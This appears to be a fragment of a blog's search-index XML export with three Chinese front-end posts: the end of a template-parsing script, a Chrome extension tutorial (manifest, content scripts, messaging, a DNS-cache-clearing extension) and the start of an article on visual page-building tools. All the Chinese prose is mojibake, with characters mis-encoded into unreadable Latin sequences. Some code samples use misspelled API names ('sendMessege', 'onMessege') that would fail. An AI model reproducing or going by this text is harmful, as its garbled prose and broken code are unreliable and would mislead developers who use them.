_listData = parseData(_list, node) node.appendChild(_item) _listData.data.forEach((_dataItem, index) =&gt; &#123; const _copyItem = _item.cloneNode(true) if(node.path) &#123; _copyItem.path = node.path.slice() &#125; if(!_copyItem.path) &#123; _copyItem.path = [] &#125; _copyItem.path.push(index) scan(_copyItem) node.insertBefore(_copyItem, _item) &#125;) node.removeChild(_item) &#125;)&#125;//å½“æ¨¡ç‰ˆè§£æç»“æŸåç»‘å®šæ‰€æœ‰äº‹ä»¶register.build()]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Chrome æ’ä»¶å®è·µæŒ‡å—]]></title>
    <url>%2F2019%2F09%2F21%2FWeb%E5%89%8D%E7%AB%AF%2FChrome%20%E6%8F%92%E4%BB%B6%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ ä»€ä¹ˆæ˜¯ Chrome æ’ä»¶ä¼—æ‰€å‘¨çŸ¥ï¼Œåœ¨ Chrome çš„å¤šè¿›ç¨‹æ¶æ„ä¸­ï¼ŒåŒ…å«è¿™æ ·å‡ ç§è¿›ç¨‹ï¼š æµè§ˆå™¨ä¸»è¿›ç¨‹ã€‚ æ•´ä¸ªæµè§ˆå™¨çš„ä¸»è¦è¿›ç¨‹ï¼Œå…¶ä»–å‡ ä¸ªè¿›ç¨‹éƒ½æ˜¯è¿™ä¸ªè¿›ç¨‹çš„å­è¿›ç¨‹ï¼Œç”±å®ƒæ¥ç®¡ç†å’Œè°ƒé…ï¼›åŒæ—¶ä½ æ‰€çœ‹åˆ°çš„æµè§ˆå™¨çš„æ•´ä¸ªçª—å£ï¼ŒåŒ…å«åœ°å€è¾“å…¥æ ï¼Œä¹¦ç­¾æ è¿™äº›ä¸œè¥¿ä¹Ÿéƒ½æ˜¯å®ƒæ¥å±•ç¤ºçš„ï¼› æ¸²æŸ“è¿›ç¨‹ã€‚ ä¸€èˆ¬æ¥è¯´ä¸€ä¸ª Tab æ ‡ç­¾é¡µé¢å°±æ˜¯ä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹ï¼›æ¯ä¸ªæ¸²æŸ“è¿›ç¨‹ä¸­ä¼šè¿è¡Œ Blink å¸ƒå±€å¼•æ“ï¼ŒV8 JavaScript æ‰§è¡Œå¼•æ“ç­‰ï¼Œå•ç‹¬æœåŠ¡äºä¸€ä¸ª Tab æ ‡ç­¾é¡µï¼›è¿è¡Œåœ¨æ²™ç›’ä¸­æ— æ³•è®¿é—®ç³»ç»Ÿèµ„æºã€‚ æ’ä»¶è¿›ç¨‹ã€‚ ä¸€ä¸ªæ’ä»¶å•ç‹¬å­˜åœ¨äºä¸€ä¸ªè¿›ç¨‹å½“ä¸­ï¼ŒåŒæ—¶ä¸ºäº†å®‰å…¨æ€§ï¼Œè¿è¡Œåœ¨æ²™ç›’ä¸­é™åˆ¶å…¶æƒé™ã€‚ ç½‘ç»œè¿›ç¨‹ã€‚ å‘èµ·ç½‘ç»œè¯·æ±‚è®¿é—®ã€‚ GPU è¿›ç¨‹ã€‚ å¤„ç† GPU æ¸²æŸ“æ–¹é¢çš„ä»»åŠ¡ã€‚ Chrome æ’ä»¶å°±æ˜¯è¿è¡Œåœ¨ Chrome æµè§ˆå™¨ä¸­çš„æ‹“å±•ç¨‹åºï¼Œæ‰€å±æµè§ˆå™¨æ’ä»¶è¿›ç¨‹ã€‚ç±»ä¼¼ Electron æ˜¯è¿ç”¨ Web æŠ€æœ¯åŠ  Electron æä¾›ç»™æˆ‘ä»¬çš„ API å¼€å‘ï¼ŒChrome æ’ä»¶å…¶å®å°±æ˜¯è¿ç”¨ Web æŠ€æœ¯å’Œ Chrome çš„ API å¼€å‘çš„èƒ½å¢å¼º Chrome åŠŸèƒ½çš„ web è½¯ä»¶è€Œå·²ã€‚Chrome Extension API ä¸­å·²ç»åˆ—å‡ºäº†æˆ‘ä»¬æ‰€æœ‰èƒ½ç”¨åˆ°çš„ APIï¼ŒChrome æ’ä»¶å¯ä»¥åšåˆ°ä½†ä¸é™äºä»¥ä¸‹åŠŸèƒ½ï¼š ç½‘ç»œè¯·æ±‚æ§åˆ¶ è‡ªå®šä¹‰å³é”® ç½‘é¡µä¸­æ’å…¥ CSS ã€JavaScript æ–‡ä»¶ ç®¡ç†ä¹¦ç­¾ ç®¡ç† cookie omnibox ç®¡ç† â€¦ åŸºæœ¬æ¦‚å¿µåŸºæœ¬ç»„æˆå¼€å‘ä¸€ä¸ª Chrome æ’ä»¶æœ€å¸¸ç”¨æœ€åŸºæœ¬ç»„æˆåŒ…æ‹¬ï¼š manifest.json background script content script popup manifest.json1234567891011121314151617181920212223242526272829303132333435363738&#123; &quot;name&quot;: &quot;æ‰©å±•åç§°&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;manifest_version&quot;: 2, &quot;description&quot;: &quot;æ‰©å±•æè¿°&quot;, &quot;icons&quot; : &#123; // æ‰©å±•çš„icon &quot;16&quot; : &quot;icon.png&quot;, &quot;48&quot; : &quot;icon.png&quot;, &quot;128&quot; : &quot;icon.png&quot; &#125;, &quot;browser_action&quot;: &#123; // ç¨‹åºå›¾æ ‡ä¼šå‡ºç°åœ¨åœ°å€æ å³ä¾§ï¼Œè‹¥è¦å‡ºç°åœ¨åœ°å€æ åˆ™å†™æˆ page_action &quot;default_title&quot;: &quot;æ—¥æŠ¥å·¥å…·&quot;, &quot;default_icon&quot;: &quot;icon.png&quot;, &quot;default_popup&quot;: &quot;popup.html&quot; &#125;, &quot;background&quot;: &#123; // background å¸¸é©» Chrome åå°çš„é¡µé¢ &quot;scripts&quot;: [&quot;background.js&quot;] &#125;, &quot;content_scripts&quot;: [ // content_scripts æ˜¯åœ¨ Web é¡µé¢å†…è¿è¡Œçš„ javascript è„šæœ¬ &#123; &quot;matches&quot;: [ &quot;http://www.google.com/*&quot; ], &quot;css&quot;: [ &quot;custom.css&quot; ], &quot;js&quot;: [ &quot;custom.js&quot; ], &quot;all_frames&quot;: true, &quot;run_at&quot;: &quot;document_idle&quot; &#125; ], &quot;permissions&quot;: [ // ä¸€äº›æƒé™çš„é…ç½® &quot;cookies&quot;, // cookieæƒé™ &quot;notifications&quot; // ç³»ç»Ÿé€šçŸ¥æƒé™ ]&#125; background scriptbackground å¯ä»¥ç†è§£ä¸ºæ˜¯ä¸€ä¸ªå¸¸é©» Chrome åå°çš„é¡µé¢ï¼Œåªè¦æµè§ˆå™¨æ‰“å¼€å®ƒå°±å­˜åœ¨ï¼ŒChrome å…³é—­å®ƒæ‰å…³é—­ï¼Œä¸€èˆ¬æŠŠéœ€è¦ä¸€ç›´è¿è¡Œçš„å…¨å±€çš„ä»£ç éƒ½æ”¾åœ¨ background é‡Œã€‚ content scriptåœ¨ Chrome æ’ä»¶ä¸­ä½¿ç”¨ Content Scripts æœ‰ä»¥ä¸‹ä¸¤ç§æ–¹å¼ï¼š åœ¨ manifest.json æ–‡ä»¶ä¸­å£°æ˜ Content Scripts 12345678910111213&#123; &quot;version&quot;: &quot;0.0.1&quot;, &quot;name&quot;: &quot;welearnmore-content_scripts&quot;, &quot;manifest_version&quot;: 2, &quot;description&quot;: &quot;welearnmore&quot;, &quot;content_scripts&quot;: [ &#123; &quot;matches&quot;: [&quot;https://icepy.me/*&quot;], &quot;js&quot;: [&quot;content_scripts.js&quot;] &#125; ], &quot;content_security_policy&quot;: &quot;script-src &apos;self&apos; &apos;unsafe-eval&apos;; object-src &apos;self&apos;;&quot;&#125; åŠ¨æ€æ³¨å…¥ Content Scripts åˆ©ç”¨ chrome.tabs.executeScript å‘é¡µé¢åŠ¨æ€æ³¨å…¥ä¸€æ®µ Content Scripts ã€‚ 12345chrome.runtime.onMessage.addListener(function(request, sender, sendResponse)&#123; chrome.tabs.create(&#123; url: &apos;https://icepy.me&apos;&#125;, function(tab)&#123; chrome.tabs.executeScript(tab.id, &#123;file: &apos;dynamic_content_scripts.js&apos;&#125;); &#125;);&#125;) popupPopup å°±æ˜¯ä¸€ä¸ªæ™®é€šçš„HTMLæ–‡ä»¶ï¼Œå®ƒå¯ä»¥åŒ…å«ä»»ä½•å†…å®¹ï¼Œæ¯”å¦‚ï¼šHTMLï¼ŒCSSï¼ŒJavaScriptï¼Œä¸æ™®é€šç½‘é¡µå”¯ä¸€çš„åŒºåˆ«æ˜¯ï¼Œå®ƒæ˜¾ç¤ºåœ¨æµè§ˆå™¨çš„å³ä¸Šè§’ã€‚ å¦‚æœè¦å¼€å¯ Popup éœ€åœ¨ manifest.json æ–‡ä»¶ä¸­ é…ç½®å…¥å£æ–‡ä»¶ ï¼š 123456789&#123; &quot;name&quot;: &quot;æˆ‘çš„popupæ‰©å±•ç¨‹åº&quot;, &quot;version&quot;: &quot;2.0&quot;, &quot;browser_action&quot;: &#123; &quot;default_title&quot;: &quot;popup action page&quot;, &quot;default_icon&quot;: &quot;img/logo.png&quot;, &quot;default_popup&quot;: &quot;popup.html&quot; &#125;&#125; é€šä¿¡æœºåˆ¶content script =&gt; background123456789101112// åœ¨ content-script ç«¯å‘é€æ¶ˆæ¯chrome.runtime.sendMessege( message, function(response) &#123;â€¦&#125;)// åœ¨ background ç«¯ç›‘å¬æ¶ˆæ¯chrome.runtime.onMessege.addListener( function(request, sender, sendResponse) &#123; sendResponse(&apos;å·²æ”¶åˆ°æ¶ˆæ¯ï¼š&apos;+JSON.stringify(request)) &#125;) background =&gt; content scriptä¸€ä¸ªæ’ä»¶é‡Œåªæœ‰ä¸€ä¸ª background ç¯å¢ƒï¼Œè€Œ content-script å¯ä»¥æœ‰å¤šä¸ªï¼ˆä¸€ä¸ªé¡µé¢ä¸€ä¸ªï¼‰ã€‚ 123456789101112131415161718/** * è·å–å½“å‰é€‰é¡¹å¡id * @param callback - è·å–åˆ°idåè¦æ‰§è¡Œçš„å›è°ƒå‡½æ•° */function getCurrentTabId(callback) &#123; chrome.tabs.query(&#123;active: true, currentWindow: true&#125;, function (tabs) &#123; if (callback) &#123; callback(tabs.length ? tabs[0].id: null); &#125; &#125;);&#125;// åœ¨ background ç«¯å‘é€æ¶ˆæ¯chrome.tabs.sendMessage(tabId, message, function(response) &#123;...&#125;);// åœ¨ content-script ç«¯ç›‘å¬æ¶ˆæ¯chrome.runtime.onMessege.addListener(function(request, sender, sendResponse) &#123; â€¦&#125;) popup =&gt; backgroundpopup ä¸ background é€šä¿¡ï¼Œå¯ä»¥ä½¿ç”¨chrome.runtime.sendMessageå’Œchrome.runtime.onMessage 123456// background.js ä¸­ï¼Œåˆ©ç”¨æ¶ˆæ¯é€šä¿¡çš„æœºåˆ¶ï¼Œå»æ‰“å¼€ä¸€ä¸ªtabï¼Œç”± Popup é¡µé¢ä¸­çš„æŸä¸ªæŒ‰é’®æ¥è§¦å‘chrome.runtime.onMessage.addListener(function(request, sender, sendResponse)&#123; chrome.tabs.create(&#123; url: &apos;https://icepy.me&apos;&#125;, function(tab)&#123; chrome.tabs.executeScript(tab.id, &#123;file: &apos;dynamic_content_scripts.js&apos;&#125;); &#125;);&#125;) åœ¨ popup ä¸­ä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨ background é‡Œçš„æ–¹æ³•ï¼š 12var bg = chrome.extension.getBackgroundPage();bg.dosomething(); // dosomething æ˜¯ background ä¸­ä¸€ä¸ª method DNS ç¼“å­˜æ¸…é™¤æ’ä»¶å¼€å‘ç›®å½•ç»“æ„123456./â”œâ”€ manifest.json //æ‰©å±•çš„é…ç½®é¡¹â”œâ”€ Custom.js //è‡ªå®šä¹‰jsè„šæœ¬â”œâ”€ Custom.css //è‡ªå®šä¹‰cssæ ·å¼â”œâ”€ icon.png //æ‰©å±•ç¨‹åºçš„iconâ””â”€ popup.html //æ‰©å±•çš„å±•ç¤ºå¼¹çª— ä»£ç å®ç°manifest.json123456789101112131415&#123; &quot;name&quot;: &quot;dns-clear&quot;, &quot;version&quot;: &quot;0.0.1&quot;, &quot;description&quot;: &quot;clear chrome dns cache&quot;, &quot;manifest_version&quot;: 2, &quot;browser_action&quot;: &#123; &quot;default_title&quot;: &quot;dns-clear&quot;, &quot;default_icon&quot;: &quot;img/logo.png&quot;, &quot;default_popup&quot;: &quot;popup.html&quot; &#125;, &quot;background&quot;: &#123; &quot;scripts&quot;: [&quot;background.js&quot;] &#125;, &quot;permissions&quot;: [&quot;nativeMessaging&quot;, &quot;tabs&quot;, &quot;background&quot;]&#125; popup1234567891011121314151617181920212223242526const CLEAR_DNS = &apos;clear dns&apos;;var bmmode = localStorage.getItem(&apos;bmmode&apos;);// optionvar checkbox = document.getElementById(&apos;clear-checkbox&apos;);checkbox.checked = bmmode === &apos;true&apos; ? &apos;checked&apos; : &apos;&apos;;checkbox.addEventListener(&apos;click&apos;, function() &#123; bmmode = this.checked; localStorage.setItem(&apos;bmmode&apos;, bmmode);&#125;);// æ¸…é™¤ dnsvar btn = document.getElementById(&apos;clear-btn&apos;);btn.addEventListener(&apos;click&apos;, function() &#123; chrome.runtime.sendMessage( &#123; action: CLEAR_DNS, bmmode: bmmode &#125;, response =&gt; &#123; // å¤„ç† console.log(&apos;response&apos;, response); &#125; );&#125;); background12345678910111213141516171819202122232425262728293031323334const CLEAR_DNS = &apos;clear dns&apos;;const SOCKETS_URL = &apos;chrome://net-internals/#sockets&apos;;var tabs = chrome.tabs;chrome.runtime.onMessage.addListener((request, sender, sendResponse) =&gt; &#123; var action = request.action; var bmmode = request.bmmode; switch (action) &#123; case CLEAR_DNS: clearDns(bmmode); break; &#125;&#125;);function clearDns(bmmode) &#123; var bm = chrome.benchmarking; if (bm &amp;&amp; bmmode === &apos;true&apos;) &#123; bm.clearHostResolverCache(); bm.clearCache(); bm.closeConnections(); &#125; else &#123; tabs.query(&#123; url: SOCKETS_URL &#125;, function(tabArr) &#123; if (tabArr.length &gt; 0) &#123; tabs.update(tabArr[0].id, &#123; active: true &#125;, function() &#123; tabs.reload(); &#125;); &#125; else &#123; tabs.create(&#123; url: SOCKETS_URL, active: true &#125;, function() &#123; tabs.reload(); &#125;); &#125; &#125;); å®‰è£…è°ƒè¯•åŠ è½½å®Œæˆåï¼Œå¯ä»¥çœ‹åˆ° èƒŒæ™¯é¡µï¼Œç‚¹å‡»æ‰“å¼€ï¼Œå°±çœ‹åˆ°æˆ‘ä»¬ç†Ÿæ‚‰çš„è°ƒæ§å°äº†ã€‚ å‚è€ƒæ–‡æ¡£ Chrome å®˜æ–¹æ–‡æ¡£ Chrome Extension å…¥é—¨æŒ‡å— ä¸€ç¯‡æ–‡ç« æ•™ä½ é¡ºåˆ©å…¥é—¨å’Œå¼€å‘chromeæ‰©å±•ç¨‹åºï¼ˆæ’ä»¶ï¼‰ è¯´è¯´Chromeæ’ä»¶ä»å¼€å‘è°ƒè¯•åˆ°æ‰“åŒ…å‘å¸ƒ]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·æŠ€æœ¯è¦ç‚¹]]></title>
    <url>%2F2019%2F09%2F21%2FWeb%E5%89%8D%E7%AB%AF%2F%E9%A1%B5%E9%9D%A2%E5%8F%AF%E8%A7%86%E5%8C%96%E6%90%AD%E5%BB%BA%E5%B7%A5%E5%85%B7%E6%8A%80%E6%9C%AF%E8%A6%81%E7%82%B9%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªæ˜é‡‘ï¼Œä½œè€…CntChenï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://juejin.im/post/5c627cce6fb9a049cd54ade1 èƒŒæ™¯é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·, æ˜¯äº’è”ç½‘å…¬å¸ä¸­å¸¸è§çš„è¿è¥å·¥å…·, å®ç°äº†è¿è¥äººå‘˜å¿«é€Ÿç”Ÿæˆå’Œå‘å¸ƒé¡µé¢, æå‡é¡µé¢ä¸Šçº¿æ•ˆç‡; ä¸”æ— éœ€å¼€å‘äººå‘˜ä»‹å…¥, èŠ‚çœå¼€å‘äººåŠ›. é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·æ­å»ºå‡ºçš„é¡µé¢ç¤ºä¾‹: ä½†ä»é›¶å¼€å§‹è®¾è®¡å’Œå¼€å‘å‡ºè¿™ç§å·¥å…·å¹¶ä¸ç®€å•. ç¬”è€…ç»´æŠ¤çš„é¡µé¢å¯è§†åŒ–æ­å»ºæ¡†æ¶ pipeline, æä¾›äº†é¡µé¢å¯è§†åŒ–æ­å»ºçš„æ ¸å¿ƒåŠŸèƒ½, å…å»ä»é›¶å®ç°é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·çš„å›°éš¾. æœ¬æ–‡ä¸»è¦åŒ…å«ä»¥ä¸‹å†…å®¹: æ´»åŠ¨é¡µé¢é‡å¤å¼€å‘çš„ç—›ç‚¹. å¼€å‘å¯è§†åŒ–æ­å»ºå·¥å…·çš„æŠ€æœ¯è¦ç‚¹. ç†æƒ³çš„è¿è¥é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·. å¼€æºé¡µé¢æ­å»ºæ¡†æ¶ pipeline ä»‹ç». æ´»åŠ¨é¡µé¢å¼€å‘ä¹‹ç—›æ´»åŠ¨é¡µé¢ç‰¹ç‚¹å‰ç«¯ä¸šåŠ¡ä¸­, ç»å¸¸éœ€è¦å¼€å‘äº§å“ä»‹ç»é¡µ/è¥é”€é¡µ/æ´»åŠ¨é¡µ/å›¾ç‰‡å±•ç¤ºé¡µç­‰é¡µé¢. è¿™ç±»éœ€æ±‚æœ‰ä»¥ä¸‹å‡ ä¸ªç‰¹ç‚¹: é¡µé¢ç±»ä¼¼: é¡µé¢å¸ƒå±€å’Œä¸šåŠ¡é€»è¾‘è¾ƒå›ºå®š. éœ€æ±‚é«˜é¢‘: æ¯å‘¨ç”šè‡³æ¯å¤©æœ‰å¤šä¸ªè¿™ç§éœ€æ±‚. è¿­ä»£å¿«é€Ÿ: å¼€å‘æ—¶é—´çŸ­, ä¸Šçº¿æ—¶é—´ç´§. å¼€å‘æ€§ä»·æ¯”ä½: å¼€å‘ä»»åŠ¡é‡å¤, æ¶ˆè€—å„æ–¹çš„æ²Ÿé€šæ—¶é—´å’ŒäººåŠ›. æ´»åŠ¨é¡µé¢å¸¸è§„å¼€å‘æµç¨‹æ´»åŠ¨é¡µé¢å¸¸è§„å¼€å‘æµç¨‹å›¾ æµç¨‹ è¿è¥/äº§å“æå‡ºé¡µé¢éœ€æ±‚. èµ°é¡¹ç›®æµç¨‹è¿›å…¥å¼€å‘ç¯èŠ‚. å¼€å‘æ ¹æ®è®¾è®¡ç¨¿å®Œæˆé¡µé¢å¼€å‘. æµ‹è¯•è¿›è¡Œé¡µé¢æµ‹è¯•. è¿ç»´è¿›è¡Œé¡µé¢ä¸Šçº¿. è¿è¥/äº§å“è¿›è¡Œé¡µé¢éªŒæ”¶. ç—›ç‚¹ æ–¹å¤šå‚ä¸, åå¤æ²Ÿé€š, ä¸²è¡Œæµç¨‹. é¡µé¢ä¸Šçº¿å‘¨æœŸé•¿, æ— æ³•å¿«é€Ÿå“åº”æ´»åŠ¨éœ€æ±‚. äººåŠ›é™·å…¥é‡å¤å·¥ä½œæ³¥æ½­, å¿™ç¢Œè€Œä½æ•ˆ. æ›´ä¼˜çš„æµç¨‹å¯¹äºé«˜é¢‘å’Œé‡å¤çš„æ´»åŠ¨é¡µé¢å¼€å‘, ä¸šç•Œä¸€èˆ¬å°†é¡µé¢åšæˆé…ç½®åŒ–, é…ç½®å·¥ä½œä»å¼€å‘äººå‘˜äº¤æ¥ç»™äº§å“/è¿è¥ç­‰éœ€æ±‚æ–¹; å¼€å‘å’Œè®¾è®¡äººå‘˜åªéœ€æä¾›é…ç½®åŒ–é¡µé¢æ”¯æŒ. æ›´ä¼˜çš„æ´»åŠ¨é¡µé¢ç”Ÿæˆæµç¨‹ä¾é é¡µé¢å¯è§†åŒ–æ­å»ºç³»ç»Ÿæ¥å®ç°. æ›´ä¼˜çš„æ´»åŠ¨é¡µé¢å¼€å‘æµç¨‹å›¾ æµç¨‹ è¿è¥/äº§å“æå‡ºé¡µé¢éœ€æ±‚. è¿è¥/äº§å“åœ¨é¡µé¢å¯è§†åŒ–æ­å»ºç³»ç»Ÿä¸­é€‰å–åˆé€‚çš„é¡µé¢æ¨¡æ¿è¿›è¡Œé¡µé¢æ­å»º. é¡µé¢è‡ªåŠ¨åŒ–å‘å¸ƒä¸Šçº¿, é¡µé¢éœ€æ±‚å®Œæˆ, æµç¨‹å®Œç»“. å¦‚æœè¿è¥/äº§å“æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„æ¨¡æ¿. å¼€å‘è¿›è¡Œé¡µé¢æ¨¡æ¿å¼€å‘, å¹¶å°†é¡µé¢æ¨¡æ¿æ·»åŠ åˆ°é¡µé¢å¯è§†åŒ–æ­å»ºç³»ç»Ÿä¸­. è¿è¥/äº§å“ç»§ç»­æµç¨‹2. åŒæ—¶, éšç€é¡µé¢å¯è§†åŒ–æ­å»ºç³»ç»Ÿä¸­çš„é¡µé¢æ¨¡æ¿ä¸æ–­ä¸°å¯Œ, æ–°çš„é¡µé¢éœ€æ±‚å¯¹å¼€å‘äººå‘˜çš„ä¾èµ–é€æ¸å‡ä½, å¯ç”±è¿è¥/äº§å“ç›´æ¥å®Œæˆ. é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·æ›´ä¼˜çš„æ´»åŠ¨é¡µé¢å¼€å‘æµç¨‹ä¾é é¡µé¢å¯è§†åŒ–æ­å»ºç³»ç»Ÿå®ç°, é‡ç‚¹æ˜¯è¦æœ‰é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·æä¾›æŠ€æœ¯æ”¯æŒ. é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·é€šè¿‡å¡«å†™é…ç½®æ•°æ®è¡¨å•, æ‹–æ‹‰é¡µé¢ç»„ä»¶ç­‰å¯è§†åŒ–çš„é¡µé¢ç¼–è¾‘æ–¹å¼, å®ç°é¡µé¢çš„ç”Ÿæˆæˆ–ä¿®æ”¹. ä½†ä»é›¶å¼€å§‹è®¾è®¡å’Œå¼€å‘å‡ºé¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·å¹¶ä¸ç®€å•, æœ‰å‡ ä¸ªéœ€è¦äº†è§£å’Œå…³æ³¨çš„æŠ€æœ¯ç‚¹. é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·çš„æŠ€æœ¯è¦ç‚¹ä»æŠ€æœ¯è§’åº¦, è®¾è®¡å’Œå¼€å‘ä¸€ä¸ªé¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·æ—¶, éœ€è¦è€ƒè™‘ä»¥ä¸‹å‡ ä¸ªæŠ€æœ¯è¦ç‚¹: é¡µé¢ç»„ä»¶åŒ– é¡µé¢æ¨¡æ¿ é¡µé¢å¯è§†åŒ–ç¼–è¾‘ ç»„ä»¶å±‚çº§å…³ç³» é¡µé¢æ‰“åŒ… å®æ—¶é¢„è§ˆ é¡µé¢ç»„ä»¶å¼€å‘ é¡µé¢ç»„ä»¶åŒ–ç»„ä»¶åŒ–çš„ä¼˜ç‚¹é¡µé¢çš„åŸºæœ¬å•å…ƒæ˜¯ HTML å…ƒç´ , ä½†æ˜¯ HTML å…ƒç´ æ— æ³•åŒ…å«ä¸šåŠ¡é€»è¾‘, ä¸”ç”± HTML å…ƒç´ ç›´æ¥ç»„åˆå‡ºé¡µé¢, è¿‡äºç¹æ‚å’Œä½æ•ˆ. å›¾ç‰‡æ¥æº: é¡µé¢è¾ƒå¥½çš„ç»„ç»‡æ–¹å¼æ˜¯ç»„ä»¶åŒ–, å¦‚ä¸Šå›¾æ‰€ç¤º. ç»„ä»¶æ˜¯å¯¹ HTML å…ƒç´ ã€å…ƒç´ å¸ƒå±€å’Œæ ·å¼ã€ä¸šåŠ¡é€»è¾‘çš„å°è£…. é€šè¿‡ç»„ä»¶å°è£…ä¸šåŠ¡é€»è¾‘, å¹¶é€šè¿‡ç»„ä»¶å±æ€§(Props)å‘å¤–æš´éœ²ç»„ä»¶çš„é…ç½®å­—æ®µ. é‡‡ç”¨é¡µé¢ç»„ä»¶åŒ–, å¤æ‚çš„é¡µé¢å¯è§†åŒ–æ­å»ºå¯ä»¥è½¬åŒ–ä¸º2ä¸ªè¾ƒç®€å•çš„æ“ä½œ: ç»„ä»¶æ ‘ç»„åˆ, é¡µé¢å¯è§†åŒ–æ­å»ºå˜æˆé¡µé¢ç»„ä»¶çš„å¯è§†åŒ–ç»„åˆ. ç»„ä»¶é…ç½®ç¼–è¾‘, å°†å¯¹é¡µé¢å†…å®¹çš„ç¼–è¾‘è½¬åŒ–ä¸ºå¯¹ç»„ä»¶çš„é…ç½®å±æ€§(props)ä¿®æ”¹. é¡µé¢å‰ç«¯æ¡†æ¶é¡µé¢ç»„ä»¶åŒ–éœ€ä¾é å‰ç«¯æ¡†æ¶æ¥å®ç°. é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·çš„æ¶æ„æ–¹å¼å¯¹é¡µé¢å‰ç«¯æ¡†æ¶æœ‰é™åˆ¶: éœ€é€‰æ‹©é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·æ”¯æŒçš„å‰ç«¯æ¡†æ¶. å¦‚: é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·åªæ”¯æŒåŸºäº vue çš„é¡µé¢, é‚£é¡µé¢ç»„ä»¶åŒ–çš„å‰ç«¯æ¡†æ¶åªèƒ½é€‰æ‹© vue. ä½†æ˜¯å‰ç«¯æŠ€æœ¯å›¢é˜Ÿé€‰ç”¨çš„å‰ç«¯æ¡†æ¶, ä¸€èˆ¬å·²ç”¨äºæ”¯æŒç°æœ‰ä¸šåŠ¡, å¹¶æ²‰æ·€äº†ä¸€å®šæ•°é‡çš„æŠ€æœ¯ç»„ä»¶å’Œä¸šåŠ¡ç»„ä»¶. å¦‚æœéœ€è¦é’ˆå¯¹é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·è¿›è¡Œå‰ç«¯æ¡†æ¶çš„åˆ‡æ¢, æˆæœ¬å°†ä¼šå¾ˆå¤§. æ‰€ä»¥ç†æƒ³çš„é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·, åº”è¯¥å’Œé¡µé¢çš„å‰ç«¯æ¡†æ¶è§£å¶, å¦‚ä¸‹å›¾æ‰€ç¤º. æŠ€æœ¯å›¢é˜Ÿåœ¨æŸå‰ç«¯æ¡†æ¶ä¸­æ²‰æ·€çš„æŠ€æœ¯ç»„ä»¶å’Œä¸šåŠ¡ç»„ä»¶, å¯åœ¨é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·çš„é¡µé¢ä¸­å¤ç”¨. æŠ€æœ¯éš¾ç‚¹1:é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·ä¸é¡µé¢å‰ç«¯æ¡†æ¶è§£å¶. å½“ç„¶, å‰ç«¯ä¸šåŠ¡å·²é€‰ç”¨äº†æŸå‰ç«¯æ¡†æ¶, å¼€å‘ä¸“é—¨æ”¯æŒè¯¥å‰ç«¯æ¡†æ¶çš„é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·, ä¹Ÿæ˜¯é«˜æ•ˆå®ç°ç›®æ ‡çš„é€‰æ‹©. é¡µé¢æ¨¡æ¿é¡µé¢æ¨¡æ¿åŒ…å«å®Œæ•´çš„ä¸šåŠ¡é€»è¾‘, æœ‰åŠ©äºå¿«é€Ÿç”Ÿæˆä¸šåŠ¡é¡µé¢. ä¸åŒçš„é¡µé¢æ¨¡æ¿é€‚ç”¨äºä¸åŒçš„ä¸šåŠ¡åŠŸèƒ½, ä»æ¨¡æ¿åº“ä¸­é€‰æ‹©åˆé€‚çš„é¡µé¢æ¨¡æ¿å¹¶æ´¾ç”Ÿå‡ºé»˜è®¤ä¸šåŠ¡é¡µé¢, å†å¯¹é»˜è®¤é¡µé¢è¿›è¡Œå¯è§†åŒ–ç¼–è¾‘, ä»è€Œç”Ÿæˆç›®æ ‡ä¸šåŠ¡é¡µé¢. äº‘å‡¤è¶çš„é¡µé¢æ¨¡æ¿åˆ—è¡¨: æ¨¡æ¿å¸¦æœ‰é¡µé¢çš„é»˜è®¤æ•°æ®; å¯¹äºç»„ä»¶åŒ–çš„é¡µé¢, æ¨¡æ¿æ˜¯ä»ç»„ä»¶åº“ä¸­é€‰å–éƒ¨åˆ†ç»„ä»¶, å¹¶å¸¦æœ‰å„ä¸ªç»„ä»¶çš„é»˜è®¤é…ç½®æ•°æ®. å¦‚ä¸Šå›¾æ‰€ç¤º, é¡µé¢ç»„ä»¶åº“ä¸­æœ‰ç»„ä»¶A, ç»„ä»¶B, ç»„ä»¶C, ç»„ä»¶D, â€¦, ç»„ä»¶Xç­‰. é¡µé¢æ¨¡æ¿ä¸€ç”±ç»„ä»¶åº“ä¸­çš„ç»„ä»¶A, ç»„ä»¶Bå’Œç»„ä»¶Cç»„æˆ, å®ç°äº†ä¸€ä¸ªå®Œæ•´çš„ä¸šåŠ¡åŠŸèƒ½; é¡µé¢æ¨¡æ¿äºŒç”±ç»„ä»¶åº“ä¸­çš„ç»„ä»¶A, ç»„ä»¶Bå’Œç»„ä»¶Xç»„æˆ, 